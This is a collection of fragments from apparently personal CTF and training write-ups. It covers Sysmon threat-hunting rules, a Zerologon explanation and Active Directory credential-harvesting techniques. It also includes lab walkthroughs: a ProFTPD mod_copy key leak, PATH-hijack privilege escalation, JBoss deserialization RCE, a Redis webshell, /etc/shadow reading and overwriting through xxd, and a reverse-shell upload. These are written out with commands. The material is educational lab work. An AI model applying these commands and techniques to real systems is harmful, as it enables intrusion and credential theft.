\n\t\t\u003cProcessAccess onmatch=\"exclude\"\u003e  \n\t\t\t\u003cSourceImage condition=\"image\"\u003esvchost.exe\u003c/SourceImage\u003e  \n\t\t\u003c/ProcessAccess\u003e\n\t\t\u003cProcessAccess onmatch=\"include\"\u003e  \n\t\t\t\u003cTargetImage condition=\"image\"\u003elsass.exe\u003c/TargetImage\u003e  \n\t\t\u003c/ProcessAccess\u003e  \n\t\u003c/RuleGroup\u003e\n\t```\n\t- or with powershell\n\t```powershell\n\tGet-WinEvent -Path .\\Hunting_Mimikatz.evtx -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name=\"TargetImage\"] and */EventData/Data=\"C:\\Windows\\system32\\lsass.exe\"' | Format-List\n\t```\n\t\n## Hunting Malware\n- RATs typically come with other Anti-Virus and detection evasion techniques\n\t- also uses a Client-Server model and comes with an interface for easy user administration\n\t- examples: [Xeexe]() \u0026 [Quasar]()\n- to detect and hunt malware we will need to first identify the malware that we want to hunt or detect and identify ways that we can modify configuration files, this is known as **hypothesis-based hunting**\n- look through and create a configuration file to hunt and detect suspicious ports open on the endpoint\n- example from [Ion-Storm]() which will alert specific ports *(i.e `1034` \u0026 `1604`)* as well ass exclude common network conn *(e.g OneDrive)*\n\t```xml\n\t\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\t\u003cNetworkConnect onmatch=\"include\"\u003e  \n\t\t\t\u003cDestinationPort condition=\"is\"\u003e1034\u003c/DestinationPort\u003e  \n\t\t\t\u003cDestinationPort condition=\"is\"\u003e1604\u003c/DestinationPort\u003e  \n\t\t\u003c/NetworkConnect\u003e  \n\t\t\u003cNetworkConnect onmatch=\"exclude\"\u003e  \n\t\t\t\u003cImage condition=\"image\"\u003eOneDrive.exe\u003c/Image\u003e  \n\t\t\u003c/NetworkConnect\u003e  \n\t\u003c/RuleGroup\u003e\n\t```\n\t\n\u003e **NOTE**: When using configuration files in a production env you need to understand exactly what is happening within the conf file. (e.g ¬†the Ion-Storm configuration file excludes port 53 as an event which adversaries have begun to usse as part of their payloads)\n\n- look for all `Network connection` events that have the destination port `8080`\n```powershell\nGet-WinEvent -Path .\\Hunting_Rats.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=8080' |Format-List\n```\n\n## Hunting Persistence\n- persistence is used by attackers to maintain access to a machine once it is compromised\n- there's multiple ways an attacker can achieve this, but we will focus on [registry modification](https://attack.mitre.org/techniques/T1112/) \u0026 [startup scripts](https://attack.mitre.org/techniques/T1547/) *(i.e File Creation events as well as Registry Modification events)*\n### Startup \n- SwiftOnSecurity detections for a file being placed in the¬†`\\Startup\\`¬†or¬†`\\Start Menu`¬†directories.\n```xml\n\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\u003cFileCreate onmatch=\"include\"\u003e  \n\t\t\u003cTargetFilename name=\"T1023\" condition=\"contains\"\u003e\\Start Menu\u003c/TargetFilename\u003e

SwiftOnSecurity detection this time for a registry modification that adjusts that places a script inside¬†`CurrentVersion\\Windows\\Run`¬†and other registry locations\n\n```xml\n\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\u003cRegistryEvent onmatch=\"include\"\u003e  \n\t\t\u003cTargetObject name=\"T1060,RunKey\"

Evasion Techniques\n- Various evasion techniques are used by malware authors to both evade anti-virus \u0026 detections *(e.g Alternate Data Streams, Injections, Masquerading, Packing/Compression, Recompiling, Obfuscation, Anti-Reversing Techniques)*\n- [Injection techniques](https://attack.mitre.org/techniques/T1055/) come in many different types: Thread Hijacking, PE Injection,¬†DLL¬†Injection, and more\n\n### Hunting ADS\n- [Alternate Data Streams are used by malware](https://attack.mitre.org/techniques/T1564/004/) to hide its files from normal inspection by saving the file in a different stream apart from¬†`$DATA`\n- Event ID 15 will hash and log any NTFS Streams that are included within the Sysmon configuration file\n- To aid in hunting ADS we will be using the SwiftOnSecurity Sysmon configuration file: will look for files in the¬†`Temp`¬†and¬†`Startup`¬†folder as well as¬†`.hta`¬†and¬†`.bat`¬†extension\n```xml\n\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\u003cFileCreateStreamHash onmatch=\"include\"\u003e  \n\t\t\u003cTargetFilename condition=\"contains\"\u003eDownloads\u003c/TargetFilename\u003e

adversaries also commonly use remote threads to evade detections in combination with other techniques\n- remote threads are created using the Windows API¬†`CreateRemoteThread`¬†and can be accessed using¬†`OpenThread`¬†and¬†`ResumeThread`\n- used in multiple evasion techniques including¬†DLL¬†Injection, Thread Hijacking, and Process Hollowing\n- will be using the Sysmon `eventID 8` from the SwiftOnSecurity configuration file\n- exclude common remote threads without including any specific attributes this allows for a more open and precise event rule\n```xml\n\u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e  \n\t\u003cCreateRemoteThread onmatch=\"exclude\"\u003e  \n\t\t\u003cSourceImage condition=\"is\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/SourceImage\u003e

\n\u003c/RuleGroup\u003e\n```\n\n### Detecting Evasion Techniques with PowerShell\n- Detecting Alternate Data Streams: `Get-WinEvent -Path \u003cPath to Log\u003e -FilterXPath '*/System/EventID=15'`\n- Detecting Remote Thread Creation: `Get-WinEvent -Path \u003cPath to Log\u003e -FilterXPath '*/System/EventID=8'`\n\n## Practical Investigations\nEvent files used within this task have been sourced from the¬†[EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/tree/master)¬†and¬†[SysmonResources](https://github.com/jymcheong/SysmonResources)Github repositories.\n\n### 1 - ugh, BILL THAT'S THE WRONG USB!\nIn this investigation, your team has received reports that a malicious file was dropped onto a host by a malicious USB.

    "content": "\n## NetLogon Protocol\n\n- **Overview**\n\t- is an RPC interface *(Windows domain controllers)*\n\t- used 4 user and machine authentication *(e.g logging in to servers using NTLM, update password)*\n\t- available over TCP through a dynamic port set by the *portmapper* service OR through an SMB pipe on `445`\n\t- it uses a customized cryptographic protocol to let a client *(a domain-joined computer)* and server *(the domain controller)* prove to each other that they both know a shared secret *(i.e hash of the client's account password)*\n- initial auth handshake\n\t- ![[write-ups/images/Pasted image 20220602151627.png]]\n\n## AES-CFB8 insecure use\n- The cryptographic primitive both the client and server use to generate credential values is implemented in a function called `ComputeNetlogonCredential` *(takes an 8-byte input \u0026 performs transformasion w the secret esssion key)*\n- To acomplish this it uses the [CFB8 (8-bit cypher feedback) mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CFB)\n\t- ![[write-ups/images/Pasted image 20220603141153.png]]\n- Instead of generating the Initialization Vector *(IV)* randomly, the `ComputeNetlogonCredential` function **defines it as a fixed value which consits of 16 zero bytes** =\u003e this violates the requirments for using AES-CFB8 securely\n- Ok but what could go wrong? Well: **for 1 in 256 keys, applying AESCFB8 encryption to an all-zero plaintext will result in all-zero ciphertext**\n\t- ![[write-ups/images/Pasted image 20220603141629.png]]\n\n## Exploitation\n![[write-ups/images/Pasted image 20220603143500.png]]\n1. Spoofing the client credential\n\t- after exchanging challenges with a `NetrServerReqChallenge` call\n\t- a client authenticates by doing a `NetrServerAuthenticate3` call, which has a parameter `ClientCredential` *(that is computed by applying the `ComputeNetlogonCredential` to the client challenge)*\n\t- because we have control over the client challenge there's nothing stopping us to set it to 8 zeroes =\u003e for 1 in 256 session keys, the correct `ClientCredential` will also consist of 8 zeroes\n\t- session key will be different for every authentication attempt\n\t- computer accounts are not locked after invalid login attempt =\u003e we can try a bunch of times until we hit a key \u0026 authentication succeeds\n2. Disabling signing \u0026 sealing\n\t- ok we can bypass the auth call, but we still have no idea what the value of the session key is\n\t- it becomess problematic due to Netlogon'ss transport encryption mechanism *(RPC signing \u0026 sealing)*, which uses this key but a different scheme than `ComputeNetlogonCredential`\n\t- luckily, signing \u0026 sealing is optional =\u003e so we can simply omit the flag in the `NetrServerAuthenticate3` call \u0026 continue\n3. Spoofing a call\n\t- even when encryption is disabled, every call must contain a so-called `authenticator` value which is computed by applying `ComputeNetlogonCredential(w session key)` to the `ClientStoredCredential + Timestamp`\n\t\t- `ClientStoredCredential`: incrementing value maintained by the client \u0026 intialised to the same value as the `ClientCredential` we provided =\u003e will be 0\n\t\t- `Timestamp`: the current Posix time; server doesn't place many restriction on this value =\u003e simply pretend that it‚Äôs January 1st, 1970 = 0\n\t- `ComputeNetlogonCredential(0) = 0` =\u003e we can authenticate our first call by simply providing an all-zero authenticator \u0026 timestamp\n4. Changing computer's AD password\n\t- we can leverage the `NetrServerPasswordSet2` call to set a new password for the client\n\t\t- password is not hashed but it is encrypted with the session key by using again `CFB8` with an all-zero IV\n\t- plaintext password structure in the Netlogon protocol consists of 516 bytes *(last 4 being the pass len)*\n\t- provide 516 zeroes =\u003e decryption to 516 zeroes =\u003e zero-length password *(setting empty passwords for a computer is not forbidden)* =\u003e can set an empty password for any computer in the domain\n\t- afterwards, we can simply set up a new Netlogon connection on behalf of this computer\n\t\u003e **NOTE**: When changing a computer password in this way it is only changed in the AD. The targeted system itself will still locally store its original password.\n5.

    "content": "\nCovers techniques to recover AD credentials in this network:\n- NTLM Authenticated Services\n- LDAP Bind Credentials\n- Authentication Relays\n- Microsoft Deployment Toolkit\n- Configuration Files\n\nWe can use these techniques on a security assesment by targeting systems of an organisation that are internet-facing or by implanting a rogue device on the organisation's network\n\n- **Setup**\n\t- configure DNS by adding `DNS=\u003cTHMDC IP\u003e` to the `/etc/systemd/resolved.conf`¬†file \n\t- save it \u0026 restart the service: `systemctl restart systemd-resolved`\n\t- test modifications: `nslookup thmdc.za.tryhackme.com`\n\t\n## OSINT \n[OSINT](OSINT) is used to disscover information online. In the case of AD this can happen for several reasons such as:\n- Users who ask questions on public forums such as¬†[Stack Overflow](https://stackoverflow.com/)¬†but disclose sensitive information such as their credentials in the question.\n- Developers that upload scripts to services such as¬†[Github](https://github.com/)¬†with credentials hardcoded.\n- Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites. Websites such as¬†[HaveIBeenPwned](https://haveibeenpwned.com/)¬†and¬†[DeHashed](https://www.dehashed.com/)¬†provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.\n\nA detailed room on Red Team OSINT can be found¬†[here.](https://tryhackme.com/jr/redteamrecon)\n\n## Phising\nPhishing¬†is another excellent method to breach AD. Phishing usually entices users to either provide their credentials on a malicious web page or ask them to run a specific application that would install a Remote Access Trojan (RAT) in the background. This is a prevalent method since the RAT would execute in the user's context, immediately allowing you to impersonate that user's AD account. This is why phishing is such a big topic for both Red and Blue teams.\n\nA detailed room on phishing can be found¬†[here.](https://tryhackme.com/module/phishing)\n\n## NTLM Authentication Services\n- [New Technology LAN Manager (NTLM)](New Technology LAN Manager (NTLM)) is the suite of security protocols used to authenticate users' identities in [AD](../../sheets/Active Directory.md)\n- services that use NetNTLM can also be exposed to the internet. The following are some of the popular examples:\n\t- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.\n\t- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.\n\t- Exposed VPN endpoints that were integrated with AD.\n\t- Web applications that are internet-facing and make use of NetNTLM\n- allows the application to play the role of a middle man between the client and AD. All authentication is forwarded to the [AD -- Domain Controllers (DC)](../../sheets/AD -- Domain Controllers (DC).md) in the form of a challenge which will authenticate the user\n\t- ![[write-ups/images/Pasted image 20220618195656.png]]\n\t- it prevents the application from storing AD credentials, which should only be stored on a Domain Controller\n### Password Spraying\n- since most AD envs have account lockout configured, we won't be able to run a full brute-force attack\n- instead of trying multiple different passwords *(which will trigger an alert/account lockout)* we choose 1 passwoird and attempt to authenticate with all the usernames acquired\n\u003e **NOTE**: ¬†these types of attacks can be detected due to the amount of failed authentication attempts they will generate\n\n- we're provided with a list of usernames discovered during a red team OSINT exercise\n\t- also indicated the organisation's initial onboarding password: `Changeme123`\n- we're gonna use a simple python script to try the default password for all users @ the web app *([http://ntlmauth.za.tryhackme.com](http://ntlmauth.za.tryhackme.com/))*\n\n## LDAP Blind Credentials\n- another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication\n- similar to NTLM authentication, but the application directly verifies the user's creds\n\t- has a pair of AD creds that it can use to query LDAP \u0026 verify\n- popular mechanism amongst third-party (non-Microsoft) applications that integrate with AD *(e.g Gitlab, Jenkins, custom web-apps, printers, VPNs)*\n- process of authentication through LDAP:\n\t- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png)\n- can use the same typee of attacks as those leveraged against NTLM, however, since LDAP auth requires a set of AD credentials, it opens up additional attack avenues\n\t- we can attempt to recover the AD credentials used by the service to gain authenticated access to AD\n\t- once you gain a foothold on the correct host, such as a Gitlab server, it might be as simple as reading the configuration files to recover these AD credentials\n\n### LDAP Pass-Back\n- can be performed when already have access to device's configuration *(e.g printer with default creds)*\n- then we alter the LDAP conf such as the IP or hostname of the device is redirected to our machine so we can intercept the authentication attempt \u0026 recover the credentials\n- we have an interesting endpoint @ `http://printer.za.tryhackme.com/settings`\n\t- ![[write-ups/images/Pasted image 20220619004402.png]]\n- can redirect to our ip adddr \u0026 try to catch the auth req: `nc -nvlp 389`\n\t- ![[write-ups/images/Pasted image 20220619004119.png]]\n\t- `suppportedCapabilities` indicates that we have a problem\n\t- before the printer sends the creds, it's trying to negotiaate the LDAP auth method details =\u003e will select the most secure authentication method that both the printer and the LDAP server support\n\t- depending on the auth method used the creds will not be sent over in cleartext *(in some casess they'll not be transmitted over the network @ all)*\n\n### Rogue LDAP server\n- install requirments\n\t```bash\n\tsudo apt-get update \u0026\u0026 sudo apt-get -y install slapd ldap-utils \u0026\u0026 sudo systemctl enable slapd\n\t```\n- reconfigure ldap server: `sudo dpkg-reconfigure -p low slapd`\n\t- domain name \u0026 organizaation name: `za.tryhackme.com`\n\t- remove db when slapd purged: no\n\t- move old database: yes\n- downgrade the supported auth mechanisms to only `PLAIN` \u0026 `LOGIN` from `olcSaslSecProps.ldif`\n\t```\n\tdn: cn=config \n\treplace: olcSaslSecProps \n\tolcSaslSecProps: noanonymous,minssf=0,passcred\n\t```\n- patch our LDAP server config from the above file: `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif \u0026\u0026 sudo service slapd restart`\n- verify if everything's good\n\t- ![[write-ups/images/Pasted image 20220619021230.png]]\n- capture ldap credentials: `tcpdump -SX -i tun0 tcp port 389 -w ldap_pass -vv`\n- go to `http://printer.za.tryhackme.com/settings` \u0026 send LDAP auth\n- ![[write-ups/images/Pasted image 20220619021410.png]]\n\n## Authentication Relays\n\n- setup [responder](https://github.com/lgandx/Responder): `responder -I tun0` A\n\t- ![[write-ups/images/Pasted image 20220619025323.png]]\n- crack the hash: `hashcat -m 5600 svcFileCopy_hash passwordlist.txt`\n\t- ![[write-ups/images/Pasted image 20220619025204.png]]\n\n## Microsoft Deployment Toolkit\n\n- Microsoft Deployment Toolkit (MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS)\n- large organizations use MDT to deploy new images in their esstate more efficiently since the base images can be maintained \u0026 updated in a central location\n- usually MDT is integrated with Microsoft's System Center Configuration Manager *(SCCM)*: which manages all updates for all Microsoft applications, services, and operating systems\n\t- allows the IT team to preconfigure and manage boot images\n\t- when a new machine needs configuration, just plug in the network \u0026 everything happens automatically *(e.g install Office365 \u0026 AV of choice)*\n- SCCM can be seen as almost an expansion and the big brother to MDT\n\t- once the software is installed, SSCM does this type of patch management\n\t- allows the IT team to review available updates to all software installed across the estate\n\t- can also test these patches in a sandbox environment to ensure they are stable before centrally deploying them to all domain-joined machines\n\n\n### PXE Boot\n- Use PXE boot to allow new devices that are connected to the network to load and install the¬†OS¬†directly over a network connection\n- usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. Communication flow is shown below\n\t- ![[write-ups/images/Pasted image 20220619025535.png]]\n- once that's finished the client will use a TFTP connection to download the PXE boot image\n- this is quite often targeted by adveraries since one can:\n\t- inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the¬†OS¬†once the PXE boot has been completed\n\t- perform password scraping attacks to recover AD credentials used during the install\n### Exploitation\n\n## Configuration Files\n- configuration files are an excellent avenue to explore in an attempt to recover AD credentials. Depending on the host that was breached, various configuration files may be of value for enumeration *(e.g webapp, service, registry keys, centrally deployed apps)*\n- several enumeration scripts, such as¬†[Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.\n- sql enumeration: \n\t- ![[write-ups/images/Pasted image 20220619041116.png]]\n\t\t```sql\n\t\tCREATE TABLE AGENT_PROXY_CONFIG(\n\t\t\tPROXY_USAGE INTEGER NOT NULL, \n\t\t\tBYPASS_LOCAL INTEGER NOT NULL, \n\t\t\tALLOW_USER_CONFIG INTEGER NOT NULL, \n\t\t\tEXCLUSION_LIST TEXT, \n\t\t\tSYSTEM_PROXY_HTTP_AUTH_REQD INTEGER,\n\t\t\tSYSTEM_PROXY_HTTP_USER TEXT, \n\t\t\tSYSTEM_PROXY_HTTP_PASSWD TEXT,\n\t\t\tSYSTEM_PROXY_FTP_AUTH_REQD INTEGER,\n\t\t\tSYSTEM_PROXY_FTP_USER TEXT, \n\t\t\tSYSTEM_PROXY_FTP_PASSWD TEXT, \n\t\t\tPRIMARY KEY (PROXY_USAGE, BYPASS_LOCAL, ALLOW_USER_CONFIG) \n\t\t\t\tON CONFLICT REPLACE\n\t\t);\n\t\t```\n\t- ![[write-ups/images/Pasted image 20220619041608.png]]\n- ![[write-ups/images/Pasted image 20220619052118.png]]\n\n## Mitigation\n- **User awareness and training** - The weakest link in the cybersecurity chain is almost always users. Training users and making them aware that they should be careful about disclosing sensitive information such as credentials and not trust suspicious emails reduces this attack surface.\n- **Limit the exposure of AD services and applications online** - Not all applications must be accessible from the internet, especially those that support NTLM and LDAP authentication. Instead, these applications should be placed in an intranet that can be accessed through a VPN. The VPN can then support multi-factor authentication for added security.\n- **Enforce Network Access Control (NAC)** - NAC can prevent attackers from connecting rogue devices on the network. However, it will require quite a bit of effort since legitimate devices will have to be allowlisted.\n- **Enforce SMB Signing** - By enforcing SMB signing, SMB relay attacks are not possible.\n- **Follow the principle of least privileges** - In most cases, an attacker will be able to recover a set of AD credentials. By following the principle of least privilege, especially for credentials used for services, the risk associated with these credentials being compromised can be significantly reduced.\n\n---\n\n## References\n- [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)\n\n## See Also\n- [[write-ups/THM]]\n",

I know, blindly throwing exploits might not be a good idea if I were in an actual assesment, but it's a CTF =\u003e just needed to get things done *(for in-depth details about the exploit check [this section](#Wait what just happened))*\n![[write-ups/images/Pasted image 20220819071051.png]]\nThe gods were with me today \u0026 I got a shell. \n\n## Wait... what just happened\n\u003e **Note**: this section goes into detail on how this exploit actually works. However, if you just want shells \u0026 use other people scripts without understanding what you're doing, skip this part.\n\n`jexboss.py` tells us it's vulnerable to `jmx-console`, `web-console` \u0026 `JMXInvokerServlet`. I'll focus on the latter one in this PoC.\n\n\n### Examining `jexboss.py` \n`check_vul(url)` is checking the following paths\n![[write-ups/images/Pasted image 20220819090040.png]]\nthe `exploit_jmx_invoker_file_repository` it sends a serialized object through a `POST` req @ `/invoker/JMXInvokerServlet` \n![[write-ups/images/Pasted image 20220819090412.png]]\n\n\n### Getting deep into source-code\nFiring up burp to send a `GET` request to `/invoker/JMXInvoker` gets us ssome [java serialized data](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html) *(indicated by the header `¬¨√≠sr` or `aced0005` in hex)*\n![[write-ups/images/Pasted image 20220819073421.png]]\nResearching this on the Internet I found [this awesome video](https://www.youtube.com/watch?v=lH2VNlf91pY) explaining in detail the vulnerability. Briefly speaking, here's what's happening\n- in `InvokerServlet.java` it uses the `readObject()` function to get serialized data from a `POST` request\n\t- ![[write-ups/images/Pasted image 20220819172710.png]]\n- investigating the `request` object further, we find that a method called `processRequest` handles it\n\t- ![[write-ups/images/Pasted image 20220819173015.png]]\n- now, the question is where does this function gets called. As it turns out, it's used by 2 primitives `doGet` \u0026 `doPost` *(those are used by the java application to properly map HTTP requests to methods)*\n\t- ![[write-ups/images/Pasted image 20220819173136.png]]\n- so the user-supplied `request` data is unfiltered \u0026 passed all the way down to `readObject()`. There's our [Deserialization Attack](Deserialization Attacks.md)\n- ok but how did we know the url path that maps to our vulnerable class *(i.e `InvokerServlet`)*. Well, java uses an XML file [web.xml](https://javabeat.net/web-xml/) to do the mapping between a class/object name and the URL endpoint\n- taking a look at this file we see how the servlet name `JMXInvokerServlet` is mapped to our vulnerable class\n\t- ![[write-ups/images/Pasted image 20220819173952.png]]\n\t- ![[write-ups/images/Pasted image 20220819174014.png]]\n- so at what endpoint can we find `JMXInvokerServlet` ?  \n\t- ![[write-ups/images/Pasted image 20220819174258.png]]\n- wait where's the `/invoker/` that we've seen in our Burp request ? Sometime java apps run multiple sub-applications or services under them. Which in our case, the one we're interested in is `jboss-service.xml`\n\t- ![[write-ups/images/Pasted image 20220819174621.png]]\n\n### jboss deserialization to RCE\nNow that we know where the actual vulnerable code is \u0026 where we can find it the [jexboss py](#Examining jexboss py) script makes more sense. We just need to `POST` a serialized java object on `/invoker/JMXInvokerServlet` that lets us execute code \u0026 gain control of the remote server. Luckily for us, we don't need to build the payload from scratch because there's tools such as [yssoserial](https://github.com/frohoff/ysoserial): *\"a collection of utilities and property-oriented programming \"gadget chains\" discovered in common java libraries that can, under the right conditions, exploit Java applications performing¬†**unsafe deserialization**¬†of objects\"*\n\nSince they found the gadgets which would allow us to execute code, we just need to figure out which library the app is using. Looking at the source-code, we find that it uses `common-collections:3.1`, so any of these would do the job. *(if we didn't know \u0026 were in a black-box scenario, we could just try everything and see what calls back)*\n![[write-ups/images/Pasted image 20220819175912.png]]\n\nTesting, with a `ping` payload \u0026 seending it with curl\n![[write-ups/images/Pasted image 20220819180735.png]]\nBOOM, it works.

That revealed an open share with anonymity login enabled which exposed a `log.txt` file. Tried getting it with  `smbget -U \"\" -R smb://10.10.83.28/anonymous`, but got this back:\n\n```bash\nCan't read 64000 bytes at offset 0, file smb://10.10.83.28/anonymous/log.txt\nFailed to download /log.txt: Connection timed out\n```\n\nA workaround for this is to mount locally \u0026 copy the content:\n\n```bash\nsudo mkdir /mnt/smbfs \u0026\u0026 sudo mount -t cifs //10.10.83.28/anonymous /mnt/smbfs -o username=none \u0026\u0026 cp /mnt/smbfs/log.txt .\n```\n\n![[write-ups/images/Pasted image 20220801215010.png]]\n\n### NFS\nWe see port `111` running the `rpcbind` service. From the [man page](https://www.man7.org/linux/man-pages/man8/rpcbind.8.html), we see that this service just converts remote procedure calls _(RPC)_ into universal addresses. To enumerate it I used nmap: `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.83.28`\n\n```bash\nPORT    STATE SERVICE\n111/tcp open  rpcbind\n| nfs-showmount: \n|_  /var *\n```\n\n### FTP\nWe also have an FTP port open on `21` which runs ProFTPD 1.3.5. Running `searchsploit ProFTPD 1.3.5` we get\n\n![[write-ups/images/Pasted image 20220801131619.png]]\n\nSo we have an [RCE](https://packetstormsecurity.com/files/162777/ProFTPd-1.3.5-Remote-Command-Execution.html) by leveraging the `mod_copy` module, to get the script I ran: `searchsploit -m 36803`. Thus, we can use the `SITE CPFR` \u0026 `SITE CPTO` cmds to copy files/dirs from one place to another on the server =\u003e any unauthenticated client can leverage them to copy files from any part of the filesystem to a chosen destination\n\n## Getting user\nSince we have the open network file system in `/var` \u0026 we know that the FTP service is running as the `Kenobi` user *(from `log.txt`)* =\u003e we can leak Kenobi's SSH key\n\n![[write-ups/images/Pasted image 20220801131505.png]]\n\nThen just `chmod 700 id_rsa \u0026\u0026 ssh -i id_rsa kenobi@10.10.83.28`\n\n## Privilage Escalation\n- find `SUID`, `SGID` \u0026 `Sticky` binaries: `find / -perm -u=s -type f 2\u003e/dev/null`\n\t- ![[write-ups/images/Pasted image 20220801133918.png]]\n- we see the `menu` binary which is quite peculiar, so let's run it\n\t- ![[write-ups/images/Pasted image 20220801134008.png]]\n- it seems that it's just a helper script that let's us check the status of the web server, get the kernel version \u0026 run `ifconfig`. Let's do some more digging\n\t- ![[write-ups/images/Pasted image 20220801134236.png]]\n- we see that it uses `curl`, `uname` \u0026 `ifconfig`. However, it's not specifying a full path to the binary =\u003e we can hijack one of these programs by placing a copy in the `$PATH` before the original one \u0026 run whatever we want, so let's try it\n\t```bash\n\techo /bin/bash \u003e ifconfig\n\tchmod 777 ifconfig\n\tmkdir bin\n\tmv ifconfig bin\n\t```\n\t- ![[write-ups/images/Pasted image 20220801134826.png]]\n\n## Refs\n- [mod_copy module docs](http://www.proftpd.org/docs/contrib/mod_copy.html)\n- [HakTricks privesc linux](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path)\n\n## See Also\n- [[write-ups/THM]]\n",

Redis response with info ... ]\nclient list\n[ ... Redis response with connected clients ... ]\nCONFIG GET *\n[ ... Get config ... ]\n```\n\n## Redis RCE with PHP\n- Since we know the **path** of the web site folder *(`var/www/html`)*, the first question is if we can write files there using redis. Turns out [you can](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html) by leveraging [CONFIG SET](https://redis.io/commands/config-set/) to choose where we want to write \u0026 [SET](https://redis.io/commands/set/) to write our content as a [key](https://redis.io/commands/keys/).\n\t- ![[write-ups/images/Pasted image 20220808103318.png]]\n- Then just navigate to `http://\u003cip\u003e/redis.php?c=\u003ccmd\u003e` \u0026 execute whatever you want üòã\n\t- ![[write-ups/images/Pasted image 20220808103515.png]]\n\t- ![[write-ups/images/Pasted image 20220808124224.png]]\n\n## Getting root\n- I started by searching for any SUID binaries: \n\t- ![[write-ups/images/Pasted image 20220808124425.png]]\n- with a quick look on [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/) we find that we can use `xxd` to read/write files as root\n\t```bash\n\t# Get the root flag\n\tLFILE=\"/root/root.txt\" \u0026\u0026 xxd \"$LFILE\" | xxd -r\n\t# Retrieve /etc/shadow\n\tLFILE=\"/etc/shadow\" \u0026\u0026 xxd \"$LFILE\" | xxd -r\n\t```\n\n### Cracking `/etc/shadow`\nOnce `/etc/shadow` \u0026 `/etc/passwd` are dumped you need to combine them in a format that `john` understands. For that we have the [unshadow](https://www.commandlinux.com/man-page/man8/unshadow.8.html) utiltiy\n\n![[write-ups/images/Pasted image 20220808125234.png]]\n\n### Hijack `/etc/shadow` to set root password\nAt this point, you could just submit the flags \u0026 move on. But how could I do that without a root shell? ü´†\n\nSo we have write access through `xxd`, but what can we do with it? It [turns out](https://medium.com/@gaby_perso/privileges-escalation-with-suid-992c279c9bc3) you can just modify the original `/etc/shadow` file with our own \u0026 set the root password. \nIf you look in the [shadow documentation](https://linux.die.net/man/5/shadow) it specifies that the 2nd parameter contains the encrypted password of the user by the use of crypt tools\n![[write-ups/images/Pasted image 20220808144127.png]]\n\nAnd we can see that being applied with `vianka`, so why not use `xxd` to place our own password there for root ? First, we need to generate the hash. We know that the salt should be `$6$2p` from `vianka`, so a little python magic is required:\n![[write-ups/images/Pasted image 20220808144338.png]]\nOnce we have the hash just replace the `!` char with it, upload the file to the remote host *(`python -m http.server`)*, change the original one using `LFILE=/etc/shadow \u0026\u0026 cat my_shadow | xxd | xxd -r - \"$LFILE\"` \u0026 `su root` \n![[write-ups/images/Pasted image 20220808125409.png]]\n\n\n## Refs\n- https://stackoverflow.com/questions/19581059/misconf-redis-is-configured-to-save-rdb-snapshots\n- https://www.trendmicro.com/en_us/research/20/d/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining.html\n- https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell\n- https://www.npmjs.com/package/redis-dump\n- https://lzone.de/cheat-sheet/Redis\n- https://github.com/n0b0dyCN/redis-rogue-server\n- https://gtfobins.github.io/gtfobins/xxd/\n- https://www.commandlinux.com/man-page/man8/unshadow.8.html\n- https://medium.com/@gaby_perso/privileges-escalation-with-suid-992c279c9bc3\n\n## See Also\n- [[write-ups/THM]]",

So I made an account \u0026 logged in afterwards\n![[write-ups/images/Pasted image 20220819191859.png]]\nCouldn't inject anything by the search functionality\n![[write-ups/images/Pasted image 20220819191937.png]]\n\n## Bypass restriction on password reset \u0026 get admin\nAt this point I just clicked everything on the dashboard to see what kind of functionality does it provide \u0026 I found that I could reset my password @ `/v2/ResetUser.php`\n![[write-ups/images/Pasted image 20220819192123.png]]\n\nAs you can see, it seems that we can't change the username field from the browser... But what about Burp?\n\n![[write-ups/images/Pasted image 20220819192242.png]]\n\nAnd it just passes through ü•≥ . Ok, we can reset the password of any user \u0026 posibly take over their account, but how do we know the users available? We need some kind of user enumeration or leakeage, so i started looking around. If we go on our `profile.php` we see that we can change our user profile only if we're admin \u0026 we're conveniently given an email address. Nothing could go wrong right?\n\n![[write-ups/images/Pasted image 20220819192623.png]]\n\nSo repeat the process from before, log out \u0026 sign in as admin with your new password üòÑ\n\n## Webshell upload\nWe now have the upload functionality available, and we all know it's kind of bad if not properly configured. So I just grabbed a [revshell](https://www.revshells.com/) \u0026 uploaded it.\n![[write-ups/images/Pasted image 20220819193211.png]]\n\nIt seems that it went through, but where do we access it. I got stuck here for a bit, trying to brute-force my way in finding a path. After a while, I decided to take a look at the good old html source \u0026 found this:\n\n![[write-ups/images/Pasted image 20220819193340.png]]\n\nGuess, I've wasted some valuable time there üòÖ . But now that we know the path just start a listener \u0026 go to `http://10.10.10.29/v2/profileimages/revsh.php`\n![[write-ups/images/Pasted image 20220819193530.png]]\n\n## Escalating to 